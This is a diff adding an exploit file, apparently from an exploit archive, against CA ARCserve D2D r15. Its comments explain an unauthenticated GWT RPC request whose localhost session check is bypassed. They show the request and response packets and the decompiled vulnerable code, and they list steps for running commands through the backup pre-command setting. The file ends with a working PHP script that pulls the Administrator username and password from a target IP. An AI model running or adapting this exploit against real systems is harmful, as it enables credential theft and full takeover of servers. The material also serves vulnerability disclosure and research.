@@ -1,0 +1,396 @@
+# Exploit Title:CA ARCserve D2D r15 GWT RPC Request Auth Bypass / Credentials Disclosure and Commands Execution
+# Google Dork: /
+# Date: 25 July 2011
+# Author: rgod
+# Software Link: /
+# Version: r15.0
+# Tested on: Microsoft Windows Server 2003 r2 sp2
+# CVE : none 
+<?php
+/*
+CA ARCserve D2D r15 GWT RPC Request Auth Bypass /
+Credentials Disclosure and Commands Execution PoC
+
+product homepage: http://arcserve.com/us/default.aspx
+
+file tested: CA_ARCserve_D2D_Setup_BMR.zip
+
+tested against: Microsoft Windows Server 2003 r2 sp2
+
+This software installs a Tomcat HTTP server which listens
+on port 8014 for incoming connections (this port is also
+added automatically to firewall exceptions to exhacerbate 
+the vulnerability I am going to describe).
+It uses a GWT RPC (Google Web Toolkit Remote Procedure
+Call) mechanism to receive messages from the Administrator
+browser.
+
+Without prior authentication, a remote user with access
+to the web server can send a POST request to the homepageServlet
+serlvet containing the "getLocalHost" message and the correct
+filename of a certain descriptor to disclose the
+username and password of the target application.
+This username and password pair are Windows credentials
+with Administrator privileges, requested during
+the ARCserve installation process (it clearly says this, an user
+from the Administrators group).
+
+This works with the mentioned software perfectly 
+installed and configured and after the Administrator user 
+logged in *one time each Tomcat session, logged out or not*
+(which I think is easily exploitable against a production 
+service running twenty four hours a day). You could also choose
+to resend the request indefinetely, waiting for the Administrator
+to be logged in.
+
+Example packet:
+
+POST /contents/service/homepage HTTP/1.1
+Content-Type: text/x-gwt-rpc; charset=utf-8
+User-Agent: GoogleBot/2.1
+Host: 192.168.0.1:8014
+Content-Length: 149
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: donotshowgettingstarted=%7B%22state%22%3Atrue%7D
+
+5|0|4|http://192.168.0.1:8014/contents/|2C6B33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client.homepage.HomepageService|getLocalHost|1|2|3|4|0|
+
+Note that '2C6B33BED38F825C48AE73C093241510' is a static value
+which represents a filename of a gwt rpc descriptor which can be found inside the default path:
+
+C:\Program Files\CA\ARCserve D2D\TOMCAT\webapps\ROOT\contents\2C6B33BED38F825C48AE73C093241510.gwt.rpc
+
+Note also that this packet does not contain any session id.
+
+Response packet:
+
+HTTP/1.1 200 OK
+Server: Apache-Coyote/1.1
+Content-Disposition: attachment
+Content-Type: application/json;charset=utf-8
+Content-Length: 480
+Date: Wed, 13 Jul 2011 18:57:19 GMT
+
+//OK[0,17,16,8,15,14,8,13,-3,12,11,8,10,9,8,7,0,6,5,0,4,3,8,2,1,1,["com.ca.arcflash.ui.client.model.TrustHostModel/1126245943",
+"com.extjs.gxt.ui.client.data.RpcMap/3441186752","port","java.lang.Integer/3438268394","Selected","java.lang.Boolean/476441737",
+"hostName","java.lang.String/2004016611","RGOD_9SG","uuid","1a580961-1aa7-4225-b3aa-a522649c16ec","type",
+"user","Administrator","password","MY_PASSWORD","Protocol"],0,5] <--------------------
+
+Clear text! Clear text!!!
+
+Username -> Administrator
+Password -> MY_PASSWORD
+
+A remote attacker could then login to the affected application
+then execute arbitrary commands with Administrator group privileges
+in the following way:
+
+Browse Backup settings;
+Click Advanced tab;
+Check "Run a command before backup is started";
+Fill the white field with the desired command, ex. cmd /c start calc ;
+Fill the credentials fields with the gained username and password
+(you can use the same you had before);
+Select an existing backup destination in the Protection Settings tab;
+Browse to the main page and clicking "Backup Now";
+Select Incremental Backup and press OK;
+calc.exe is launched various times.
+
+Other attacks are possible.
+
+Vulnerable code and explaination:
+
+
+web.xml :
+...
+	<servlet>
+		<servlet-name>homepageServlet</servlet-name>
+		<servlet-class>com.ca.arcflash.ui.server.HomepageServiceImpl</servlet-class>
+		<load-on-startup>1</load-on-startup>
+	</servlet>
+
+	<servlet-mapping>
+		<servlet-name>homepageServlet</servlet-name>
+		<url-pattern>/contents/service/homepage</url-pattern>
+	</servlet-mapping>
+...
+
+the decompiled HomepageServiceImpl.class :
+
+...
+public TrustHostModel getLocalHost()
+        throws BusinessLogicException, ServiceConnectException, ServiceInternalException
+    {
+        try
+        {
+            TrustedHost trustedhost = getLocalWebServiceClient().getLocalHostAsTrust();
+            TrustHostModel trusthostmodel = ConvertToModel(trustedhost);
+            return trusthostmodel;
+        }
+        catch(AxisFault axisfault)
+        {
+            axisfault.printStackTrace();
+        }
+        return null;
+    }
+...
+
+the decompiled WebServiceClient.class :
+
+...
+public TrustedHost getLocalHostAsTrust()
+        throws AxisFault
+    {
+        Object aobj[] = invokeWebMethod("getLocalHostAsTrust", new Object[0], new Class[] {  //<------------
+            com/ca/arcflash/webservice/data/TrustedHost
+        });
+        return (TrustedHost)aobj[0];
+    }
+...
+
+a request to the FlashServiceImpl Axis2 Web Service is originated
+note that the ip address originating the request is 127.0.0.1 now!!!
+So you are using the GWT RPC endpoint as a proxy for the mentioned
+web service ...
+
+from the decompiled FlashServiceImpl.class:
+
+...
+ public TrustedHost getLocalHostAsTrust()
+        throws AxisFault
+    {
+        checkSession(); <--------------------
+        try
+        {
+            return CommonService.getInstance().getLocalHostAsTrust();
+        }
+        catch(Throwable throwable)
+        {
+            logger.error(throwable.getMessage(), throwable);
+        }
+        throw new AxisFault("Unhandled exception in web service", FlashServiceErrorCode.Common_ErrorOccursInService);
+    }
+...
+
+the checkSession() function is called but now I show you because it is bypassed,
+again from the decompiled FlashServiceImpl.class:
+
+...
+private void checkSession()
+        throws AxisFault
+    {
+        if(!enableSessionCheck)
+            return;
+        MessageContext messagecontext = MessageContext.getCurrentMessageContext();
+        Object obj = messagecontext.getProperty(HTTPConstants.MC_HTTP_SERVLETREQUEST);
+        if(obj != null && (obj instanceof HttpServletRequest))
+        {
+            HttpServletRequest httpservletrequest = (HttpServletRequest)obj;
+            HttpSession httpsession = httpservletrequest.getSession(true);
+            if(checkLocalHost(httpservletrequest.getRemoteAddr(), true)) //<--------------------------------
+                return;
+            if(httpsession.getAttribute("com.ca.arcflash.webservice.FlashServiceImpl.UserName") == null && httpsession.getAttribute("com.ca.arcflash.webservice.FlashServiceImpl.UUID") == null)
+                throw new AxisFault("Service session timeout", FlashServiceErrorCode.Common_ServiceSessionTimeout);
+        }
+    }
+...
+
+the checkLocalHost() function is called, this check means 
+"if the ip address originating the request is localhost then
+do not check the session but go on". 
+
+look to checkLocalHost() and to initializeIPList() functions inside FlashServiceImpl.class:
+...
+ private boolean checkLocalHost(String s, boolean flag)
+    {
+        logger.debug((new StringBuilder()).append("checkLocalHost begin, host:").append(s).append(", localCall:").append(flag).toString());
+        if(localhostIPList == null)
+            initializeIPList();
+        if(s == null || s.length() == 0)
+            return false;
+        s = s.trim();
+        if(logger.isDebugEnabled())
+        {
+            logger.debug((new StringBuilder()).append("localhostIPList size:").append(localhostIPList.size()).toString());
+            String s1;
+            for(Iterator iterator = localhostIPList.iterator(); iterator.hasNext(); logger.debug((new StringBuilder()).append("LocalHost:").append(s1).toString()))
+                s1 = (String)iterator.next();
+
+        }
+        boolean flag1 = false;
+        Iterator iterator1 = localhostIPList.iterator();
+        do
+        {
+            if(!iterator1.hasNext())
+                break;
+            String s2 = (String)iterator1.next();
+            if(!s.equalsIgnoreCase(s2))
+                continue;
+            flag1 = true;
+            break;
+        } while(true);
+        logger.debug((new StringBuilder()).append("checkLocalHost end, isLocal:").append(flag1).toString());
+        return flag1;
+    }
+
+    private static synchronized void initializeIPList()
+    {
+        if(localhostIPList != null)
+            return;
+        localhostIPList = new ArrayList();
+        localhostIPList.add("localhost"); //<-------------------------
+        localhostIPList.add("127.0.0.1"); //<-------------------------
+        try
+        {
+            InetAddress inetaddress = InetAddress.getLocalHost();
+            String s = inetaddress.getHostAddress();
+            String s1 = inetaddress.getHostName();
+            if(s != null && !localhostIPList.contains(s))
+                localhostIPList.add(s);
+            if(s1 != null && !localhostIPList.contains(s1))
+                localhostIPList.add(s1);
+            String s2 = inetaddress.getCanonicalHostName();
+            if(s2 != null)
+            {
+                int i = s2.indexOf('.');
+                if(i > 0)
+                {
+                    localhostIPList.add((new StringBuilder()).append("localhost").append(s2.substring(i)).toString());
+                    localhostIPList.add(s2);
+                }
+            }
+        }
+        catch(Exception exception)
+        {
+            logger.error("InetAddress error:", exception);
+        }
+        try
+        {
+            Enumeration enumeration = NetworkInterface.getNetworkInterfaces();
+            if(enumeration != null)
+                while(enumeration.hasMoreElements()) 
+                {
+                    NetworkInterface networkinterface = (NetworkInterface)enumeration.nextElement();
+                    Enumeration enumeration1 = networkinterface.getInetAddresses();
+                    while(enumeration1.hasMoreElements()) 
+                    {
+                        InetAddress inetaddress1 = (InetAddress)enumeration1.nextElement();
+                        String s3 = inetaddress1.getHostAddress();
+                        if(s3 != null && !localhostIPList.contains(s3))
+                            localhostIPList.add(s3);
+                    }
+                }
+        }
+        catch(Exception exception1)
+        {
+            logger.error("NetworkInterface error:", exception1);
+        }
+    }
+...
+
+a match is performed against the localhostIPList array then the web service
+cannot know which is the real ip address of the remote user but thinks it is
+127.0.0.1 ! 
+
+again, from the decompiled HomepageServiceImpl.class :
+
+...
+private TrustHostModel ConvertToModel(TrustedHost trustedhost)
+    {
+        TrustHostModel trusthostmodel = new TrustHostModel();
+        trusthostmodel.setHostName(trustedhost.getName());
+        trusthostmodel.setPassword(trustedhost.getPassword());
+        trusthostmodel.setPort(Integer.valueOf(trustedhost.getPort()));
+        trusthostmodel.setType(Integer.valueOf(trustedhost.getType()));
+        trusthostmodel.setUser(trustedhost.getUserName());
+        trusthostmodel.setUuid(trustedhost.getUuid());
+        trusthostmodel.setProtocol(trustedhost.getProtocol());
+        trusthostmodel.setSelected(Boolean.valueOf(false));
+        return trusthostmodel;
+    }
+...
+
+this prepares the output, returning the object properties previously used to store the 
+admin credentials.
+
+The following code can be used to disclose them, you can perform post-auth commands
+execution by browsing the target application and act as described.
+ 
+rgod
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_ca_d2d.php [ip_address]\r\n" );
+       die();
+    }
+    
+	$argv[1] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: donotshowgettingstarted=%7B%22state%22%3Atrue%7D;".$ck ,
+            "Content-Type: text/x-gwt-rpc; charset=utf-8;"
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "Jakarta Commons-HttpClient/3.1");
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 8014;
+
+$rpc='5|0|4|http://".$host.":8014/contents/|2C6B33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client.homepage.HomepageService|getLocalHost|1|2|3|4|0|';
+$url = "http://$host:$port/contents/service/homepage";
+$out = _s($url, 1, "", $rpc);
+if (strpos($out,"The call failed on the server;") or (!strpos($out,"200 OK"))){
+  print("[!] Error, maybe patched or admin never logged in. See output...\n");
+  print($out);
+}
+else {
+$temp=explode("\"user\",\"",$out);$temp=explode("\"",$temp[1]);$usr=trim($temp[0]);
+print("Username: ".$usr."\n");
+$temp=explode("\"password\",\"",$out);$temp=explode("\"",$temp[1]);$pwd=trim($temp[0]);
+print("Password: ".$pwd."\n");
+}
+?>
